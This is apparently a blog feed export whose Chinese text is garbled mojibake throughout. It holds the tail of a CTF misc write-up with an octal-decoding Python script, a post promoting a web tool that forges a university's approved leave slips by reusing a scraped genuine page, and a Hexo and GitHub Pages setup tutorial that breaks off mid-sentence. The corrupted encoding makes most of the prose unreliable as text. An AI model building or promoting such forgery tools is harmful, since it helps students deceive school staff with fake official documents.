output_dir)</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¯ä»¥æå–å‡ºæ¥çš„ï¼Œä¸è¿‡é€Ÿåº¦æœ‰ç‚¹æ„Ÿäººï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511011814046.png" alt="image-20251101181320898"></p><p>é‡Œé¢å¯ä»¥å¬åˆ°ä¸€ä¸²æ•°å­—ï¼š</p><p><code>651466314514271616614214660701456661601411451426071146666014214371656514214470</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">octal_string = <span class="string">&quot;651466314514271616614214660701456661601411451426071146666014214371656514214470&quot;</span></span><br><span class="line">result_list = []</span><br><span class="line">current_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> current_index &lt; <span class="built_in">len</span>(octal_string):</span><br><span class="line">    <span class="comment"># Try 3-digit octal conversion</span></span><br><span class="line">    <span class="keyword">if</span> current_index + <span class="number">3</span> &lt;= <span class="built_in">len</span>(octal_string):</span><br><span class="line">        three_digit_string = octal_string[current_index:current_index + <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            three_digit_number = <span class="built_in">int</span>(three_digit_string, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= three_digit_number &lt;= <span class="number">127</span>:</span><br><span class="line">                result_list.append(<span class="built_in">chr</span>(three_digit_number))</span><br><span class="line">                current_index += <span class="number">3</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span>  <span class="comment"># If conversion fails, try 2-digit</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Try 2-digit octal conversion</span></span><br><span class="line">    <span class="keyword">if</span> current_index + <span class="number">2</span> &lt;= <span class="built_in">len</span>(octal_string):</span><br><span class="line">        two_digit_string = octal_string[current_index:current_index + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            two_digit_number = <span class="built_in">int</span>(two_digit_string, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">32</span> &lt;= two_digit_number &lt;= <span class="number">127</span>:</span><br><span class="line">                result_list.append(<span class="built_in">chr</span>(two_digit_number))</span><br><span class="line">                current_index += <span class="number">2</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span>  <span class="comment"># If conversion fails, skip</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If neither works, skip the current character</span></span><br><span class="line">    current_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">decoded_result = <span class="string">&#x27;&#x27;</span>.join(result_list)</span><br><span class="line"><span class="built_in">print</span>(decoded_result)</span><br></pre></td></tr></table></figure><p>è§£å¯†å‹ç¼©åŒ…ï¼Œå¬éŸ³é¢‘å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç²¤è¯­ï¼šä¸€åˆ‡å®‰å¥½ï¼Œæˆ‘ä¼šæŒ‰ç…§è¦æ±‚å‡†å¤‡å¥½æŠ½æŸ¥ï¼Œæˆ‘è¯¥é€åˆ°ä½•åœ°ï¼Ÿ</span><br><span class="line"></span><br><span class="line">å›½è¯­ï¼šé€è‡³åŒé‡Œæ¹–è¥¿å²¸å—å±±èŒ¶é“ºï¼Œå·¦è¾¹ç¬¬äºŒä¸ªæ©±æŸœï¼Œå‹¿æ”¾é”™</span><br><span class="line"></span><br><span class="line">ç²¤è¯­ï¼šæˆ‘å·²çŸ¥æ‚‰ï¼Œä½ åœ¨é‚£è¾¹å¯è¿˜å®‰å¥½ï¼Ÿ</span><br><span class="line"></span><br><span class="line">å›½è¯­ï¼šä¸€åˆ‡å®‰å¥½ï¼Œå¸Œæœ›ä½ æˆ‘äºŒäººæ—©æ—¥ç›¸è§ã€‚</span><br><span class="line"></span><br><span class="line">ç²¤è¯­ï¼šæŒ‡æ—¥å¯å¾…ã€‚èŒ¶å¶é€åˆ°äº†ï¼Œä½†æ˜¯æ™šäº†æ—¶æ—¥ï¼ŒèŒ¶é“ºçœ‹æ¥åªèƒ½å¦å¯»è‰¯è¾°å‰æ—¥äº†ã€‚ä½ åœ¨é‚£è¾¹ï¼Œåƒä¸‡ä¿é‡</span><br></pre></td></tr></table></figure><p>ä¸Šç½‘æœç´¢å¯¹åº”äº‹ä»¶æ‰¾åˆ°äº† 1949å¹´10æœˆ24æ—¥8æ—¶45åˆ†äºåŒé²¤æ¹–è¥¿å²¸å—å±±èŒ¶é“º</p><p>md5åå¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FakeWrfl-webui</title>
      <link href="/2025/10/12/FakeWrfl-webui/"/>
      <url>/2025/10/12/FakeWrfl-webui/</url>
      
        <content type="html"><![CDATA[<h1 id="FakeWrfl-webui"><a href="#FakeWrfl-webui" class="headerlink" title="FakeWrfl-webui"></a>FakeWrfl-webui</h1><p>åŸºäºæŸé«˜æ ¡çš„è¯·å‡æ¡æ ·å¼ï¼Œåˆ¶ä½œè€Œæˆçš„å¿«æ·è¯·å‡æ¡ç”Ÿæˆç¨‹åºã€‚</p><p>é“¾æ¥ï¼š<a href="https://github.com/c-Mitunlny/FakeWrfl">https://github.com/c-Mitunlny/FakeWrfl</a></p><hr><h2 id="åœ¨çº¿è¿è¡Œ"><a href="#åœ¨çº¿è¿è¡Œ" class="headerlink" title="åœ¨çº¿è¿è¡Œ"></a>åœ¨çº¿è¿è¡Œ</h2><iframe     src="http://120.48.101.60:3171/"     width="375px"    height="667px"    style="        border: none;        border-radius: 20px; /* æ‰‹æœºåœ†è§’ */        box-shadow: 0 10px 30px rgba(0,0,0,0.3); /* é˜´å½±æ•ˆæœ */        overflow: hidden;        display: block;        margin: 20px auto;        background: #000;    "    scrolling="auto"    allowfullscreen></iframe><h2 id="é¡¹ç›®ç®€ä»‹"><a href="#é¡¹ç›®ç®€ä»‹" class="headerlink" title="é¡¹ç›®ç®€ä»‹"></a>é¡¹ç›®ç®€ä»‹</h2><p>ä¸€ä¸ªæœ‰è¶£çš„è¯·å‡æ¡ç”Ÿæˆç¨‹åºï¼Œå¯ä»¥ä¾›å­¦ç”Ÿç”Ÿæˆè¯¥é«˜æ ¡ç»Ÿä¸€æ ·å¼çš„è¯·å‡æ¡ã€‚</p><p>å…è´£å£°æ˜ï¼šæœ¬é¡¹ç›®ä»…ä¾›å¨±ä¹å’Œç¼–ç¨‹æ€§è´¨çš„å­¦ä¹ ï¼Œå­¦ç”Ÿä½¿ç”¨æœ¬é¡¹ç›®ï¼Œå³ä»£è¡¨å…¶åŒæ„é€ æˆçš„ä¸€åˆ‡åæœç”±å…¶æœ¬äººæ‰¿æ‹…ã€‚</p><h3 id="æ›´æ–°è¯´æ˜ï¼š-å°†åŸæ¥çš„exeç¨‹åºæ”¹ä¸ºwebåº”ç”¨ï¼Œæ›´åŠ ä¾¿æ·å’Œè½»é‡åŒ–"><a href="#æ›´æ–°è¯´æ˜ï¼š-å°†åŸæ¥çš„exeç¨‹åºæ”¹ä¸ºwebåº”ç”¨ï¼Œæ›´åŠ ä¾¿æ·å’Œè½»é‡åŒ–" class="headerlink" title="æ›´æ–°è¯´æ˜ï¼š å°†åŸæ¥çš„exeç¨‹åºæ”¹ä¸ºwebåº”ç”¨ï¼Œæ›´åŠ ä¾¿æ·å’Œè½»é‡åŒ–"></a>æ›´æ–°è¯´æ˜ï¼š å°†åŸæ¥çš„exeç¨‹åºæ”¹ä¸ºwebåº”ç”¨ï¼Œæ›´åŠ ä¾¿æ·å’Œè½»é‡åŒ–</h3><p><strong>ä½¿ç”¨ç¯å¢ƒ</strong>ï¼šPython3.12</p><p><strong>ä¾èµ–ï¼š</strong>Flask</p><p><strong>ä½¿ç”¨æ–¹æ³•</strong>ï¼šè¿è¡Œapp.py</p><p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼šåˆ‡å‹¿æ”¹åŠ¨æˆ–åˆ é™¤å…¶å®ƒæ–‡ä»¶ï¼Œå¦åˆ™å¯èƒ½é€ æˆç¨‹åºæ— æ³•ä½¿ç”¨</p><h2 id="æ ¸å¿ƒåŸç†"><a href="#æ ¸å¿ƒåŸç†" class="headerlink" title="æ ¸å¿ƒåŸç†"></a>æ ¸å¿ƒåŸç†</h2><p>æŠ“å–äº†æ­£å¸¸è¯·å‡æˆåŠŸçš„å‰ç«¯é¡µé¢ï¼Œé€šè¿‡ä½¿ç”¨pythonä»£ç æ¥æ›¿æ¢å‰ç«¯é¡µé¢ä¸­çš„å„é¡¹æ•°æ®ã€‚</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510131543113.png" alt="image-20251013154310056"></p>]]></content>
      
      
      <categories>
          
          <category> ä¸ªäºº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¸ªäºº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºhexoæ¡†æ¶çš„åšå®¢æ­å»ºæ•™ç¨‹</title>
      <link href="/2025/05/20/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2025/05/20/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºäºhexoæ¡†æ¶çš„åšå®¢æ­å»ºæ•™ç¨‹"><a href="#åŸºäºhexoæ¡†æ¶çš„åšå®¢æ­å»ºæ•™ç¨‹" class="headerlink" title="åŸºäºhexoæ¡†æ¶çš„åšå®¢æ­å»ºæ•™ç¨‹"></a>åŸºäºhexoæ¡†æ¶çš„åšå®¢æ­å»ºæ•™ç¨‹</h1><blockquote><p><strong>Introduction:</strong>  ä»é›¶åˆ°ä¸€ï¼Œæ­å»ºä¸€ä¸ªå±äºä½ è‡ªå·±çš„ä¸ªäººç½‘ç«™ï¼</p></blockquote><p>æ–‡ç« å‚è€ƒï¼š<a href="https://blog.anheyu.com/"><strong>å®‰çŸ¥é±¼</strong></a> ï¼Œ<a href="https://ayakasuki.com/"><strong>æ¡ƒå­</strong></a>ï¼Œ<a href="https://blog.xiowo.net/"><strong>MortalCat</strong></a>ï¼Œ<a href="https://fe32.top/"><strong>å”å¿—è¿œ</strong></a></p><h2 id="1-ç¯å¢ƒå‡†å¤‡"><a href="#1-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="1. ç¯å¢ƒå‡†å¤‡"></a>1. ç¯å¢ƒå‡†å¤‡</h2><p>æ¼”ç¤ºæ“ä½œç³»ç»Ÿï¼šwindows11 ä¸“ä¸šç‰ˆ</p><p>éœ€è¦çš„ç¯å¢ƒï¼š</p><ul><li>gitï¼š<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li><li>Nodejsï¼š<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></li><li>Hexoï¼šè§ä¸‹æ–‡</li><li>GitHub è´¦å·ï¼ˆ<a href="https://github.com/">https://github.com/</a> éœ€è¦è‡ªè¡Œæ³¨å†Œ ps: å­¦ä¼šç§‘å­¦ä¸Šç½‘ï¼‰ / äº‘æœåŠ¡å™¨ï¼ˆç‰¹åˆ«æ³¨æ„ï¼š ä¸­å›½å†…åœ°æœåŠ¡å™¨éœ€è¦å¤‡æ¡ˆï¼‰</li><li>VScodeï¼š<a href="https://code.visualstudio.com/download">https://code.visualstudio.com/download</a></li></ul><p>å„ç§ç¯å¢ƒçš„å®‰è£…æ•™ç¨‹è‡ªè¡Œä¸Šç½‘æŸ¥æ‰¾</p><h3 id="æ³¨ï¼š"><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h3><p>Nodojså®‰è£…å¥½åï¼Œæœ€å¥½éœ€è¦æ›´æ¢npmæº(npmé»˜è®¤æºä¸ºå›½å¤–ï¼Œä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œå¯èƒ½å¼•èµ·éƒ¨åˆ†ä¾èµ–æ— æ³•å®‰è£…é—®é¢˜)</p><p>æ¢æºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmmirror.com/</span><br></pre></td></tr></table></figure><h2 id="2-å®‰è£…Hexo"><a href="#2-å®‰è£…Hexo" class="headerlink" title="2. å®‰è£…Hexo"></a>2. å®‰è£…Hexo</h2><p>å®‰è£…å¥½gitå’ŒNodejsåï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>hexo -v éªŒè¯å®‰è£…ï¼ŒæˆåŠŸä¼šè¾“å‡ºç‰ˆæœ¬ä¿¡æ¯</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510152047583.png" alt="image-20251015204736895"></p><h2 id="3-åˆå§‹åŒ–é¡¹ç›®"><a href="#3-åˆå§‹åŒ–é¡¹ç›®" class="headerlink" title="3. åˆå§‹åŒ–é¡¹ç›®"></a>3. åˆå§‹åŒ–é¡¹ç›®</h2><p>é€‰æ‹©ä¸€ä¸ªè·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„å³ä½ åšå®¢ä¹‹åæ‰€æœ‰æœ¬åœ°æ–‡ä»¶æ‰€æ”¾çš„è·¯å¾„ã€‚å»ºè®®åœ¨ç³»ç»Ÿç›˜ä¹‹å¤–ã€‚</p><p>ä½¿ç”¨hexo initæ¥åˆå§‹åŒ–é¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init example</span><br></pre></td></tr></table></figure><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170841369.png" alt="image-20251017084147278"></p><p>è¿›å…¥é¡¹ç›®æ–‡ä»¶å¤¹åæ‰“å¼€ç»ˆç«¯ï¼Œå®‰è£…ä¾èµ–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -i</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ•´ä¸ªé¡¹ç›®åˆå§‹åŒ–å®Œæ¯•ï¼š</p><p>ä½ çš„é¡¹ç›®åº”åŒ…å«ä»¥ä¸‹ç»“æ„ï¼š</p><p>ã€node_modulesã€‘ï¼šä¾èµ–åŒ…<br>ã€scaffoldsã€‘ï¼šç”Ÿæˆæ–‡ç« çš„ä¸€äº›æ¨¡æ¿<br>ã€sourceã€‘ï¼šç”¨æ¥å­˜æ”¾ä½ çš„æ–‡ç« <br>ã€themesã€‘ï¼šä¸»é¢˜<br>ã€_config.landscape.ymlã€‘ï¼šé»˜è®¤ä¸»é¢˜çš„é…ç½®æ–‡ä»¶<br>ã€config.ymlã€‘ï¼šç½‘ç«™çš„é…ç½®æ–‡ä»¶<br>ã€package-lock.jsonã€‘ï¼šé¡¹ç›®åç§°ã€æè¿°ã€ç‰ˆæœ¬ã€è¿è¡Œå’Œå¼€å‘ç­‰ä¿¡æ¯</p><p>æ­¤æ—¶ï¼Œä½ å·²ç»æˆåŠŸæ‹¥æœ‰ä¸€ä¸ªä¸ªäººç½‘é¡µäº†ï¼</p><p><strong>å¦‚ä½•æ‰“å¼€ï¼Ÿ</strong></p><p>éœ€è¦å¸¸è¯´çš„hexoä¸‰è¿</p><p>å³ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server  // Git BASHç»ˆç«¯</span><br><span class="line">hexo clean; hexo generate; hexo server  // VSCODEç»ˆç«¯</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç®€å†™ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s  // Git BASHç»ˆç«¯</span><br><span class="line">hexo cl; hexo g; hexo s  // VSCODEç»ˆç«¯</span><br></pre></td></tr></table></figure><p>æˆåŠŸåº”çœ‹åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170855717.png" alt="image-20251017085512382"></p><p>å…¶ä»£è¡¨ä½ çš„ç½‘ç«™æœåŠ¡åœ¨æœ¬åœ°çš„4000ç«¯å£å¼€æ”¾ï¼ˆå‰æä¿è¯ä½ çš„4000ç«¯å£ä¸è¢«å…¶ä»–æœåŠ¡å ç”¨ï¼Œå¦‚è¢«å ç”¨å¯æ‰‹åŠ¨æŒ‡å®šå…¶ä»–ç«¯å£æ‰“å¼€ ä¾‹å¦‚ï¼š-p 5000ï¼‰</p><p>è®¿é—®<a href="http://localhost:4000">http://localhost:4000</a> æˆ– <a href="http://127.0.0.1:4000">http://127.0.0.1:4000</a> å°±å¯ä»¥çœ‹åˆ°ä½ çš„ç½‘é¡µäº†ï¼</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170858278.png" alt="image-20251017085845604"></p><p>å½“ç„¶ï¼Œç½‘é¡µä¸­å„ç§æ–‡å­—ï¼Œæè¿°ï¼Œæ ‡é¢˜ï¼Œå›¾ç‰‡ç­‰ç­‰éƒ½æ˜¯å¯ä»¥æ”¹çš„ï¼Œå…·ä½“å°†åœ¨åæ–‡ä»‹ç»</p><h2 id="4-ä¸Šä¼ è‡³github-äº‘æœåŠ¡å™¨"><a href="#4-ä¸Šä¼ è‡³github-äº‘æœåŠ¡å™¨" class="headerlink" title="4. ä¸Šä¼ è‡³github/äº‘æœåŠ¡å™¨"></a>4. ä¸Šä¼ è‡³github/äº‘æœåŠ¡å™¨</h2><p>ä½ çš„ç½‘é¡µç›®å‰åªèƒ½åœ¨æœ¬åœ°è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ«äººæ˜¯æ— æ³•è®¿é—®çš„ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚ä½•åƒçœŸæ­£çš„ç½‘ç«™é‚£æ ·ï¼Œé€šè¿‡ä¸€ä¸ªé“¾æ¥å®ç°æ‰€æœ‰äººéƒ½èƒ½è®¿é—®å‘¢ï¼Ÿ</p><p>ä½ éœ€è¦å°†ä½ çš„ç½‘ç«™æ¨é€åˆ°ä¸å…¬ç½‘è¿æ¥çš„æœåŠ¡å™¨ä¸Šã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼šï¼ˆä»¥ä¸‹é…ç½®æ–¹æ¡ˆäºŒé€‰ä¸€å³å¯ï¼‰</p><h3 id="ä¸€-github-pages"><a href="#ä¸€-github-pages" class="headerlink" title="ä¸€. github pages"></a>ä¸€. github pages</h3><p><strong>ä¼˜ç‚¹ï¼š</strong>å®Œå…¨å…è´¹çš„æœåŠ¡ï¼Œå…è´¹ç”Ÿæˆçš„åŸŸåï¼Œæ“ä½œæ–¹ä¾¿</p><p><strong>ç¼ºç‚¹ï¼š</strong>ç½‘ç«™çš„è®¿é—®é€Ÿåº¦è¾ƒæ…¢ï¼Œéƒ¨åˆ†èµ„æºå¾ˆéš¾åŠ è½½ï¼Œå¯èƒ½éœ€è¦ç§‘å­¦ä¸Šç½‘æ‰èƒ½è®¿é—®åˆ°ä½ çš„ç½‘é¡µ</p><hr><p>ä»¥ä¸‹ä»¥github pagesä¸ºä¾‹è¿›è¡Œä¸Šä¼ ï¼š</p><h4 id="é…ç½®gitï¼Œåˆ›å»ºä»“åº“ï¼Œè¿æ¥åˆ°github"><a href="#é…ç½®gitï¼Œåˆ›å»ºä»“åº“ï¼Œè¿æ¥åˆ°github" class="headerlink" title="é…ç½®gitï¼Œåˆ›å»ºä»“åº“ï¼Œè¿æ¥åˆ°github"></a>é…ç½®gitï¼Œåˆ›å»ºä»“åº“ï¼Œè¿æ¥åˆ°github</h4><ol><li>ç¬¬ä¸€æ­¥ï¼šæ³¨å†Œgithubè´¦å·ï¼ˆéœ€è¦ç§‘å­¦ä¸Šç½‘ï¼‰</li></ol><p><a href="https://github.com/">https://github.com/</a></p><ol><li>ç¬¬äºŒæ­¥ï¼š æ³¨å†Œå®Œæˆåï¼Œç‚¹å‡»å³ä¸Šè§’çš„<code>+</code>æŒ‰é’®ï¼Œé€‰æ‹©<code>New repository</code>ï¼Œåˆ›å»ºä¸€ä¸ª<code>&lt;ç”¨æˆ·å&gt;.github.io</code>çš„ä»“åº“ã€‚</li></ol><p>é…ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170917241.png" alt="image-20251017091719130"></p><p>æ³¨æ„ï¼šæ ¼å¼å¿…é¡»ä¸º<code>xxx.github.io</code>ï¼ä¸”å¿…é¡»é€‰æ‹©<code>Public</code>ï¼</p><ol><li>ç¬¬ä¸‰æ­¥ï¼š éœ€è¦é…ç½®å¥½gitç”¨æˆ·åå’Œé‚®ç®±ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;your-username&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your-email&quot;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>git config -l</code> æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸ</p><ol><li>ç¬¬å››æ­¥ï¼š è¿æ¥åˆ°github</li></ol><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆsshå…¬é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your-email&quot;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰“å¼€Cç›˜ä¸‹ç”¨æˆ·æ–‡ä»¶å¤¹ä¸‹çš„.sshçš„æ–‡ä»¶å¤¹ï¼Œä¼šçœ‹åˆ° id_rsa.pub</p><p>ç”¨è®°äº‹æœ¬æ‰“å¼€ä¸Šè¿°å›¾ç‰‡ä¸­çš„å…¬é’¥ï¼ˆid_rsa.pubï¼‰ï¼Œå¤åˆ¶é‡Œé¢çš„å†…å®¹ã€‚<br>è¿›å…¥githubï¼Œç‚¹å‡»å³ä¸Šè§’å¤´åƒ é€‰æ‹©<code>settings</code>ï¼Œè¿›å…¥è®¾ç½®é¡µåé€‰æ‹© <code>SSH and GPG keys</code>ï¼Œåå­—éšä¾¿èµ·ï¼Œå…¬é’¥å¡«åˆ°<code>Key</code>é‚£ä¸€æ ã€‚</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170928166.png" alt="image-20251017092850917"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170928422.png" alt="image-20251017092816162"></p><ol><li>æµ‹è¯•è¿æ¥ï¼š</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>æˆåŠŸä¿¡æ¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170931798.png" alt="image-20251017093111703"></p><h4 id="å°†ç½‘ç«™ä¸Šä¼ åˆ°github"><a href="#å°†ç½‘ç«™ä¸Šä¼ åˆ°github" class="headerlink" title="å°†ç½‘ç«™ä¸Šä¼ åˆ°github"></a>å°†ç½‘ç«™ä¸Šä¼ åˆ°github</h4><p>é¦–å…ˆéœ€è¦å®‰è£…ä¾èµ–ï¼š</p><p>è¿›å…¥æœ¬åœ°åšå®¢ç½‘ç«™çš„ç›®å½•åï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰“å¼€ç›®å½•ä¸‹çš„_config.ymlï¼Œè¿™æ˜¯æ•´ä¸ªHexoæ¡†æ¶çš„é…ç½®æ–‡ä»¶ï¼Œé‡Œé¢å¯ä»¥ä¿®æ”¹ç½‘ç«™çš„å„ç§é…ç½®ã€‚</p><p>æ‰¾åˆ°deployé…ç½®ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170937898.png" alt="image-20251017093752739"></p><p>å°†repositoryä¿®æ”¹ä¸ºä½ è‡ªå·±çš„githubé¡¹ç›®åœ°å€å³å¯ï¼Œè¿˜æœ‰åˆ†æ”¯è¦æ”¹ä¸º<code>main</code>ä»£è¡¨ä¸»åˆ†æ”¯</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com:Mitunlny/example.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>é…ç½®ä¿å­˜åï¼Œè¿è¡Œhexoä¸‰è¿ä¸Šä¼ ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy  // Git BASHç»ˆç«¯</span><br><span class="line">hexo clean; hexo generate; hexo deploy  // VSCODEç»ˆç«¯</span><br></pre></td></tr></table></figure><p>ç®€å†™ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d  // Git BASHç»ˆç«¯</span><br><span class="line">hexo cl; hexo g; hexo d  // VSCODEç»ˆç«¯</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°<code>Deploy done</code>ï¼Œåˆ™è¯´æ˜éƒ¨ç½²æˆåŠŸäº†ã€‚</p><p>æ­¤æ—¶è¿›å…¥ä½ çš„é¡¹ç›®ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¤šå‡ºçš„æ–‡ä»¶äº†ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170942867.png" alt="image-20251017094222748"></p><p>æ­¤æ—¶ç‚¹å‡»ä¸Šæ–¹settings:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510170943781.png" alt="image-20251017094358699"></p><p>åœ¨pagesè¿™é‡Œä¿®æ”¹åˆ†æ”¯ä¸ºmain</p><p>ç­‰å¾…å‡ºç°ä¸Šæ–¹çš„<code>Visit site</code>ï¼Œå°±è¯´æ˜ä¸Šä¼ æˆåŠŸäº†ï¼Œå¯ä»¥é€šè¿‡ç½‘å€è®¿é—®äº†</p><hr><h3 id="äºŒ-äº‘æœåŠ¡å™¨"><a href="#äºŒ-äº‘æœåŠ¡å™¨" class="headerlink" title="äºŒ. äº‘æœåŠ¡å™¨"></a>äºŒ. äº‘æœåŠ¡å™¨</h3><p><strong>ä¼˜ç‚¹ï¼š</strong>å†…åœ°è®¿é—®é€Ÿåº¦å¿«</p><p><strong>ç¼ºç‚¹ï¼š</strong>äº‘æœåŠ¡å™¨éœ€è¦ä»˜è´¹ï¼Œéœ€è¦é¢å¤–è´­ä¹°åŸŸåï¼Œä¸”éœ€è¦è¿›è¡Œå¤‡æ¡ˆï¼ˆæ¸¯æ¾³å°é™¤å¤–ï¼‰</p><hr><p>é…ç½®æ•™ç¨‹ï¼š</p><p>é¦–å…ˆä½ 